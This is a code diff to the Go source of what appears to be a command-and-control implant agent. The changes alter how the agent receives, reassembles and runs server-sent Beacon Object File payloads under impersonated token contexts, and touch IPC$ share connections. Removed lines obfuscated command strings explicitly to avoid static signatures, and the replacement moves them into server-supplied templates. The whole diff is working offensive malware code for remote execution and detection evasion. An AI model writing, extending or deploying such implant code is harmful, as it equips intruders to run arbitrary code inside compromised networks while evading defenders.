@@ -6,6 +6,7 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"strings"
 	"sync"
@@ -22,14 +23,12 @@ const (
 
 var (
 	bofExecutionMutex sync.Mutex
-
-	// BOF command prefixes (constructed to avoid static signatures)
-	bofAsyncCmdPrefix = string([]byte{0x62, 0x6f, 0x66, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63, 0x20}) // bof-async
-	bofCmdPrefix      = string([]byte{0x62, 0x6f, 0x66, 0x20})                                     // bof
-
-	// Network share path
-	bofIPCShare = string([]byte{0x5c, 0x49, 0x50, 0x43, 0x24}) // \IPC$
 )
+
+// BOF command prefixes and network paths now accessed via template functions:
+// - bofAsyncCmdPrefix() returns "bof-async "
+// - bofCmdPrefix() returns "bof "
+// - bofIPCShare() returns "\IPC$"
 
 // ensureTokenContextForBOF ensures the correct token context is applied for BOF execution
 // Returns a cleanup function that should be called after BOF execution
@@ -187,8 +186,12 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 			}
 
 			// Also try IPC$ share
+			ipcShare := bofIPCShare()
+			if ipcShare == "" {
+				ipcShare = "\\IPC$" // Fallback
+			}
 			if idx := strings.Index(networkPath[2:], "\\"); idx > 0 {
-				ipcPath := networkPath[:idx+2] + bofIPCShare
+				ipcPath := networkPath[:idx+2] + ipcShare
 				WNetCancelConnection2(ipcPath, 0, true)
 			}
 		}
@@ -269,8 +272,42 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 		return cq.handleChunkedBOF(cmd)
 	}
 
+	// The server may wrap BOF data in JSON with template
+	// Try to parse as JSON first to extract template and actual BOF data
+	var bofData string
+	var bofArgsFromJSON string
+	var bofWrapper struct {
+		Templates []string `json:"tpl"`
+		Version   int      `json:"v"`
+		Type      int      `json:"t"`
+		BOFData   string   `json:"bof_data"`
+		ChunkData string   `json:"chunk_data"`
+		Arguments string   `json:"arguments"`
+	}
+
+	if err := json.Unmarshal([]byte(cmd.Data), &bofWrapper); err == nil {
+		// Successfully parsed JSON - extract template, BOF data, and arguments
+		if bofWrapper.Templates != nil {
+			SetBOFTemplate(bofWrapper.Templates)
+		}
+		// Use bof_data if present, otherwise chunk_data
+		if bofWrapper.BOFData != "" {
+			bofData = bofWrapper.BOFData
+		} else if bofWrapper.ChunkData != "" {
+			bofData = bofWrapper.ChunkData
+		} else {
+			// No bof_data field - the Data itself might be base64
+			bofData = cmd.Data
+		}
+		// Extract arguments from JSON wrapper
+		bofArgsFromJSON = bofWrapper.Arguments
+	} else {
+		// Not JSON - treat as raw base64 BOF data
+		bofData = cmd.Data
+	}
+
 	// Decode the BOF data from base64
-	bofBytes, err := base64.StdEncoding.DecodeString(cmd.Data)
+	bofBytes, err := base64.StdEncoding.DecodeString(bofData)
 	if err != nil {
 		return CommandResult{
 			Command:     cmd,
@@ -293,18 +330,20 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 		globalTokenStore.mu.RUnlock()
 	}
 
-	// Parse any arguments that might be in the command
+	// Get BOF arguments - check multiple sources
 	var bofArgs []byte
-	if cmd.Command != "" && strings.HasPrefix(cmd.Command, bofCmdPrefix) {
-		// Extract arguments after "bof "
-		argString := strings.TrimPrefix(cmd.Command, bofCmdPrefix)
-		if argString != "" {
-			// Parse the arguments using the lighthouse package format
-			parsedArgs, err := parseBOFArguments(argString)
-			if err != nil {
-			} else {
-				bofArgs = parsedArgs
-			}
+	// Priority 1: Top-level Arguments field
+	if cmd.Arguments != "" {
+		decodedArgs, err := base64.StdEncoding.DecodeString(cmd.Arguments)
+		if err == nil {
+			bofArgs = decodedArgs
+		}
+	}
+	// Priority 2: Arguments from JSON wrapper (for chunked BOFs)
+	if bofArgs == nil && bofArgsFromJSON != "" {
+		decodedArgs, err := base64.StdEncoding.DecodeString(bofArgsFromJSON)
+		if err == nil {
+			bofArgs = decodedArgs
 		}
 	}
 
@@ -403,6 +442,7 @@ type BOFChunkInfo struct {
 	Filename    string
 	TotalChunks int
 	Chunks      map[int]string // chunk number -> base64 data
+	Arguments   string         // base64-encoded packed arguments
 	ReceivedAt  time.Time
 }
 
@@ -428,8 +468,40 @@ func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
 		bofChunks[cmd.CommandID] = chunkInfo
 	}
 
-	// Store this chunk
-	chunkInfo.Chunks[cmd.CurrentChunk] = cmd.Data
+	// Extract actual chunk data from JSON wrapper if present
+	// Server may wrap each chunk with template and arguments
+	chunkData := cmd.Data
+	var wrapper struct {
+		Templates []string `json:"tpl"`
+		Version   int      `json:"v"`
+		Type      int      `json:"t"`
+		BOFData   string   `json:"bof_data"`
+		ChunkData string   `json:"chunk_data"`
+		Arguments string   `json:"arguments"`
+	}
+	if err := json.Unmarshal([]byte(cmd.Data), &wrapper); err == nil {
+		// Extract template on first chunk
+		if cmd.CurrentChunk == 0 && wrapper.Templates != nil {
+			SetBOFTemplate(wrapper.Templates)
+		}
+		// Use the actual chunk data
+		if wrapper.ChunkData != "" {
+			chunkData = wrapper.ChunkData
+		} else if wrapper.BOFData != "" {
+			chunkData = wrapper.BOFData
+		}
+		// Store arguments (usually comes with first chunk)
+		if wrapper.Arguments != "" && chunkInfo.Arguments == "" {
+			chunkInfo.Arguments = wrapper.Arguments
+		}
+	}
+	// Also check top-level Arguments field
+	if cmd.Arguments != "" && chunkInfo.Arguments == "" {
+		chunkInfo.Arguments = cmd.Arguments
+	}
+
+	// Store this chunk (unwrapped)
+	chunkInfo.Chunks[cmd.CurrentChunk] = chunkData
 
 
 	// Check if all chunks received
@@ -459,11 +531,15 @@ func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
 		fullData.WriteString(chunk)
 	}
 
+	// Store arguments before cleaning up
+	storedArgs := chunkInfo.Arguments
+
 	// Clean up chunk storage
 	delete(bofChunks, cmd.CommandID)
 
-	// Update the command with the reassembled data
+	// Update the command with the reassembled data and arguments
 	cmd.Data = fullData.String()
+	cmd.Arguments = storedArgs
 	cmd.TotalChunks = 1
 	cmd.CurrentChunk = 0
 
@@ -487,7 +563,38 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 		bofChunks[cmd.CommandID] = chunkInfo
 	}
 
-	chunkInfo.Chunks[cmd.CurrentChunk] = cmd.Data
+	// Extract actual chunk data from JSON wrapper if present
+	chunkData := cmd.Data
+	var wrapper struct {
+		Templates []string `json:"tpl"`
+		Version   int      `json:"v"`
+		Type      int      `json:"t"`
+		BOFData   string   `json:"bof_data"`
+		ChunkData string   `json:"chunk_data"`
+		Arguments string   `json:"arguments"`
+	}
+	if err := json.Unmarshal([]byte(cmd.Data), &wrapper); err == nil {
+		// Extract template on first chunk
+		if cmd.CurrentChunk == 0 && wrapper.Templates != nil {
+			SetBOFTemplate(wrapper.Templates)
+		}
+		// Use the actual chunk data
+		if wrapper.ChunkData != "" {
+			chunkData = wrapper.ChunkData
+		} else if wrapper.BOFData != "" {
+			chunkData = wrapper.BOFData
+		}
+		// Store arguments (usually comes with first chunk)
+		if wrapper.Arguments != "" && chunkInfo.Arguments == "" {
+			chunkInfo.Arguments = wrapper.Arguments
+		}
+	}
+	// Also check top-level Arguments field
+	if cmd.Arguments != "" && chunkInfo.Arguments == "" {
+		chunkInfo.Arguments = cmd.Arguments
+	}
+
+	chunkInfo.Chunks[cmd.CurrentChunk] = chunkData
 
 
 	if len(chunkInfo.Chunks) < cmd.TotalChunks {
@@ -514,6 +621,9 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 		fullData.WriteString(chunk)
 	}
 
+	// Store arguments before cleaning up
+	storedArgs := chunkInfo.Arguments
+
 	delete(bofChunks, cmd.CommandID)
 
 	// Decode BOF
@@ -529,19 +639,12 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 		}
 	}
 
-	// Parse arguments
+	// Get BOF arguments from stored arguments
 	var bofArgs []byte
-	if cmd.Command != "" && strings.HasPrefix(cmd.Command, bofAsyncCmdPrefix) {
-		argString := strings.TrimPrefix(cmd.Command, bofAsyncCmdPrefix)
-		if argString != "" {
-			args := strings.Fields(argString)
-			if len(args) > 0 {
-				packedArgs, err := PackArgs(args)
-				if err != nil {
-				} else {
-					bofArgs = packedArgs
-				}
-			}
+	if storedArgs != "" {
+		decodedArgs, err := base64.StdEncoding.DecodeString(storedArgs)
+		if err == nil {
+			bofArgs = decodedArgs
 		}
 	}
 
